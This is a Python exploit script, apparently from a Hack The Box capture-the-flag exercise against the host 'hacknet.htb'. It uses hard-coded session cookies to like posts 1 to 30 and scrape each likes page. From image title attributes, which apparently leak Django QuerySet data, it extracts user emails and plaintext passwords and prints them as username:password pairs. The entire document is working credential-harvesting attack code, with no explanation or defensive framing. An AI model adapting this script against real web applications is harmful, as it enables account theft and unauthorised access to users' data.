import re  
import requests  
import html  

url = "http://hacknet.htb"  
headers = {  
    'Cookie': "csrftoken=RRYFBbcsv8HPj0oN6W63l7MvrQUVFMyt; sessionid=wvtthkngfugttue0b7elgroemg0di07h"  
}  

all_users = set()

for i in range(1, 31):  
    requests.get(f"{url}/like/{i}", headers=headers)  
 
    text = requests.get(f"{url}/likes/{i}", headers=headers).text  
 
    img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
    if not img_titles:  
        continue  
    last_title = html.unescape(img_titles[-1])  

    if "<QuerySet" not in last_title:  
        requests.get(f"{url}/like/{i}", headers=headers)  
        text = requests.get(f"{url}/likes/{i}", headers=headers).text  
        img_titles = re.findall(r'<img [^>]*title="([^"]*)"', text)  
        if img_titles:  
            last_title = html.unescape(img_titles[-1])  

    emails = re.findall(r"'email': '([^']*)'", last_title)  
    passwords = re.findall(r"'password': '([^']*)'", last_title)  

    for email, p in zip(emails, passwords):  
        username = email.split('@')[0]  
        all_users.add(f"{username}:{p}")  

for item in all_users:  
    print(item)
